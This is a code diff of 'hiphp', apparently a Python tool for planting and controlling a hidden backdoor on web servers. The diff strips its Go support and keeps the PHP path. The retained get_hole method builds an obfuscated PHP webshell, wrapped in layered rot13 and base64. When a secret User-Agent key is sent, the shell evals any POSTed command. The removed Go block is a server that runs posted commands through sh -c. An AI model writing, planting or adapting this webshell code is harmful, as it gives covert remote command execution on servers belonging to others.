@@ -45,7 +45,7 @@ else:
 #start hiphp class:
 class hiphp:
     #__init__:
-    def __init__(self,key,url,retu=False,lang="php"):
+    def __init__(self,key,url,retu=False):
         #
         self.key=tomd5(str(key))# Encrypt the 'key' with 'md5'.
         self.url=str(url)
@@ -77,8 +77,6 @@ class hiphp:
 
         self.DS=hiphp.do(self,self.key,self.url,self.headers,True,DIRECTORY_SEPARATOR())
 
-        self.lang=lang.upper()
-
     #cli:
     def cli(self):
         #logo
@@ -90,11 +88,7 @@ class hiphp:
         #getcwd
         getcwd=""
         try:
-            if self.lang=="PHP":
-                reee=hiphp.do(self,self.key,self.url,self.headers,True,"echo getcwd();")
-            
-            elif self.lang=="GO":
-                reee=hiphp.do(self,self.key,self.url,self.headers,True,"echo $PWD").replace("\n","")
+            reee=hiphp.do(self,self.key,self.url,self.headers,True,"echo getcwd();")
         except:
             reee=None
         
@@ -153,8 +147,7 @@ class hiphp:
                 exit()
                 """
             else:
-                exit()
-                #return reee
+                return reee
         else:
             getcwd=self.color.c(reee,self.c_green)
         #
@@ -523,72 +516,18 @@ class hiphp:
 
     #get the hole:
     def get_hole(self,get=False):
-        if self.lang=="PHP":
-            code="if($_SERVER['HTTP_USER_AGENT']=='"+self.key+"'){echo'#"+self.key+"';if(isset($_POST['command'])){eval($_POST['command']);}exit;}"
-            code=rot13(tobase64(rot13(tobase64(rot13(code)))))
-            code=f"eval(str_rot13(base64_decode(str_rot13(base64_decode(str_rot13('{code}'))))));"
-            php_s="/*HIPHP_HOLE_CODE START*/"
-            php_e="/*HIPHP_HOLE_CODE END*/"
+        code="if($_SERVER['HTTP_USER_AGENT']=='"+self.key+"'){echo'#"+self.key+"';if(isset($_POST['command'])){eval($_POST['command']);}exit;}"
+        code=rot13(tobase64(rot13(tobase64(rot13(code)))))
+        code=f"eval(str_rot13(base64_decode(str_rot13(base64_decode(str_rot13('{code}'))))));"
+        php_s="/*HIPHP_HOLE_CODE START*/"
+        php_e="/*HIPHP_HOLE_CODE END*/"
 
-            if self.retu==True and get==False:
-                return php_s+"\n"+code+"\n"+php_e
-            else:
-                geth=self.color.c(msg_1+"\n",self.c_yellow)
-                geth+=self.color.c(php_s+"\n",self.c_red)
-                geth+=self.color.c(code+"\n",self.c_green)
-                geth+=self.color.c(php_e,self.c_red)
-                print(geth)
-        
-        if self.lang=="GO":
-            code='''
-package main
-import (
-	"net/http"
-	"os"
-	"os/exec"
-	"log"
-)
-
-func indexHandler(w http.ResponseWriter, r *http.Request) {
-
-    // Do not change anything below this.
-	userAgent := r.UserAgent()
-	key:="'''+self.key+'''"	
-	if userAgent==key {
-		w.Write([]byte("#"+key))
-		if value:=r.FormValue("command");value!=""{
-			out, err := exec.Command("sh","-c",value).Output()
-			w.Write([]byte(out))
-			if err != nil {
-				log.Fatalf("cmd.Run() failed with %s", err)
-			}
-		}
-    // Do not change anything above this.
-	}else{
-        // your website code here:
-		w.Write([]byte(userAgent))
-	}
-}
-
-// You can modify this as you wish:
-func main() {
-	port := os.Getenv("PORT")
-	if port == "" {
-		port = "3000"
-	}
-	mux := http.NewServeMux()
-	mux.HandleFunc("/", indexHandler)
-	http.ListenAndServe(":"+port, mux)
-}'''
-            php_s="/*HIPHP_HOLE_CODE for GO START*/"
-            php_e="/*HIPHP_HOLE_CODE for GO END*/"
-
-            if self.retu==True and get==False:
-                return php_s+"\n"+code+"\n"+php_e
-            else:
-                geth=self.color.c(msg_1_1+"\n",self.c_yellow)
-                geth+=self.color.c(php_s+"\n",self.c_red)
-                geth+=self.color.c(code+"\n",self.c_green)
-                geth+=self.color.c(php_e,self.c_red)
-                print(geth)
+        if self.retu==True and get==False:
+            return php_s+"\n"+code+"\n"+php_e
+        else:
+            geth=self.color.c(msg_1+"\n",self.c_yellow)
+            geth+=self.color.c(php_s+"\n",self.c_red)
+            geth+=self.color.c(code+"\n",self.c_green)
+            geth+=self.color.c(php_e,self.c_red)
+            print(geth)
 #}END.
